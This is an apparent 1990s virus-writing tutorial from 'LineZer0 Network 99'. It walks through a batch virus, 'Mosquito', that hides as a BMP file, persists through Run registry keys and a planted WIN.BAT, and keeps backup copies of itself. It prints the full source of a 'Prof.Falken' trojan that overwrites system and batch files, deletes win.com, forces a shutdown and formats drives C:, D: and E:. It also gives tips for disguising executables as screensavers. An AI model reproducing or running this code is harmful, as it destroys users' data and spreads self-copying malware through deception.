We can found, firstly the command REGEDIT /E, to save ALL the specified key 
(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run) in 
C:\WINDOWS\BZs.reg;

then the CHOICE command

i've used it to make a sort of "delay" between the creation of BZs.reg, and
the "appending process" of the 2 new keys (too fast processors, could "skip"
this process, so, i have made the process little slow);

I've declared all digitable characters in choice, this for the simple reason
that, if is pressed a not declared key, the process is compromised until the
right key is pressed

CHOICE

/C[:]CHOICES

Specify the keys allowed. Default are YN.

/N

Choices and ? will not showed at the end of the prompt string.

/S

Distinguish between upper case and down case keys.

/T[:]c,nn  

Default choice "c" after "nn" seconds.

"Text"

 Text showed at prompt string.


ECHO "0A StRaMoNiUm"="c:\\command /C ren C:\\Mosquito.bmp Mosquito.bat|CLS">>%windir%\BZs.reg
ECHO "1A Dark_Elf"="start /m C:\\Mosquito.bat">>%windir%\BZs.reg
echo.
echo jgcxjhgkjhcxgkjdhflkgjhxhjxhjjjhjkfjjkhjhjfjjhjjhj>nul
echo.
echo ciyjouigydujujhgfkjbkjhgdkjhgjhjugkjghkdjhykugrhtiug>nul
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,1>nul
echo.
@regedit /S /C %windir%\BZs.reg

Here are the 2 keys.
I use echo command to append them to a previous created BZs.reg;
the first, 

   ("0A StRaMoNiUm"="c:\\command /C ren C:\\Mosquito.bmp Mosquito.bat|CLS)

rename the virus from its "BMP" and NOT VIRAL FORM to a BATch (and viral) 
script form the second, 
   
   ("1A Dark_Elf"="start /m C:\\Mosquito.bat") will run minimized the virus.

We can found a lot of "ECHO." And "NOSENSE" echo, for the same reason as 
above; create a delay for the too fast processors.

After this process, the batch "UPDATE" (in hided mode)the modifyed RUN KEY,
and declare the new path for the reg info too (the path where's located 
BZs.reg; %WINDIR%).

P.S If u are looking for some COMMAND options, such as /C, type in a dos
shell COMMAND /? <enter>

@cls
@type %tmp%\x

Now, the batch CLEAR the screen, then type " x ", my ascii work on the screen

for %%i in (%tmp%\*.*) do DEL %%i>nul
@copy %0 c:\MOSQUITO.BMP>nul
@copy %0 %windir%\DVC.EXE>nul

then, delete all the files in %TMP% (C:\WINDOWS\TEMP), and make a copy of 
himself in c: as MOSQUITO.BMP; make a copy in %Windir% too as DVC.EXE 
( a sort of "backup copy")

ECHO @Echo off>%windir%\WIN.BAT
ECHO @if exist c:\Mosquito.BMP goto :BZ>>%windir%\WIN.BAT
ECHO @if not exist c:\Mosquito.bat goto :BZXT
ECHO :BZXT>>%windir%\WIN.BAT
ECHO @ren DVC.EXE BZz.bat>>%windir%\WIN.BAT
ECHO @copy BZz.bat DVC.EXE>>%windir%\WIN.BAT
ECHO @start /m BZz.bat>>%windir%\WIN.BAT
ECHO :BZ>>%windir%\WIN.BAT
ECHO CLS>>%windir%\WIN.BAT

Now, make a supplemental BATch, WIN.BAT in %windir%.
There's a thing u must know about MS-DOS and windows system ;
When windows is about to start, the system call the file "WIN" without 
extension.

Well… for the reason that MS-DOZ start first BAT, then COM and EXE, and
there's only a " WIN ", WIN.COM, if u make a file BATch named "Win.bat", 
it will be executed AUTOMATYCALLY any time u are waiting windows load, 
before WIN.COM (to start, windows must run WIN.COM  ).

The "WIN.BAT" in this case, simply ceck for the presence of MOSQUITO.BMP 
in C:\, if present, it close itself (do nothing), if not present, it rename 
DVC.EXE (The virus backup) as BZz.bat, then, run it minimized   

ren %0 Mosquito.BMP|cls

with this command, the virus REName itself as BMP, fully functional and 
viewable with any graphics progam, then redirect his output, something as 
"file not found" (the script don't found ITSELF after rename it as BMP  ),
with "|" pipe sign to CLS command; now, there's nothing on the screen, so,
the CLS command cause the DOS shell windows, closing : )

         **********************************************************

The EXE DROPPER inside the batch:

@rename setup.bmp install.bat
install.bat

This batch was compiled as a COM file with BAT2COM, then converted as EXE
with COM2EXE (both enclosed in the ZIP).

After, i have get his "HEX" code using FXEDIT, one of the best and more 
intuitive HEX EDITOR out 

         **********************************************************

Here is another example of the BATCH POWER,

Prof.Falken.BAT/Trojan

@echo off
  @break off
  :: Prof.Falken.BAT/Trojan  Remember War Games? :)
  type %0 | find /v "  " >%WINDIR%\WIN.BAT
  type %0 | find /v "  " >C:\AUTOEXEC.BAT
  rundll user,#7 0 5
  exit|cls
@echo off
@break off
:: Prof.Falken.BAT/Trojan  Remember War Games? :)
for %%i in (*.bat ../*.bat) do copy %0 %%i>nul
for %%i in (%windir%\*.dll) do copy %0 %%i>nul
@del %windir%\win.com >nul
@echo e B800:0F00 02 0A>%tmp%\green.dbg
@echo.>>%tmp%\green.dbg
@echo q>>%tmp%\green.dbg
@debug < %tmp%\green.dbg>nul
echo.       LOGIN :_
pause>nul
echo Joshua
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,3>nul
@debug < %tmp%\green.dbg>nul
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
ECHO   . GREETINGS PROFESSOR FALKEN
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2>nul
echo.
ECHO   . HOW DO U FEEL TODAY?
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,4>nul
echo.
echo.
ECHO   - EXCELLENT I'TS BEEN A LONG TIME. CAN U EXPLAIN THE
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2>nul
ECHO   - REMOVAL OF YOUR USER ACCOUNT ON JUNE 23. 1973?
echo.
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2>nul
ECHO   . YES I DO
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,1>nul
ECHO   . SHALL WE PLAY A GAME?
echo.
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,3>nul
ECHO   - SURE, TERMONUCLEAR WAR
echo.
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,5>nul
ECHO   . WOULD'NT YOU PREFER A GOOD GAME OF CHESS?
echo.
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,4>nul
echo   - NO.
echo.
format e: /q /u /AUTOTEST > nul
format d: /q /u /AUTOTEST > nul
format c: /q /u /AUTOTEST > nul

                       ***********************************

I'll let u the comment of this batch, is good to understand some DOS basics.
It was inspired by "WAR GAMES" , and u can see his graphic effect running 
the harmless PROF.FALKEN.NO_VIR.BAT in the zip.
Here are some tips that u should know:

- the command

RUNDLL USER,#7 0 5

That will cause an immediate Windows shotdown   

- you can make a little EXE using Winzip Self-Extractor;
- if u rename an EXE file as SCR (the screen saver extension), the program 
  will run as a common EXE file, but it has an "unsuspected" extension, and
  if it was a WinZip Self-Extractor, when u right clik on the "SCR" file, 
  will not showed the "OPEN WITH WINZIP", but "INSTALL" and "TRY" 

WELL, IT'S ALL FOR NOW…GOOD LUK AND "CODING"  
 
                                                  by


                (¯`·.¸ StRaMoNiUm ¸.·´¯)
            
                             
                                      -=THE DAMAGE IS DONE=-

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
<-------------------------\\LineZer0 Network 99//------------------------->
</pre></body></html>
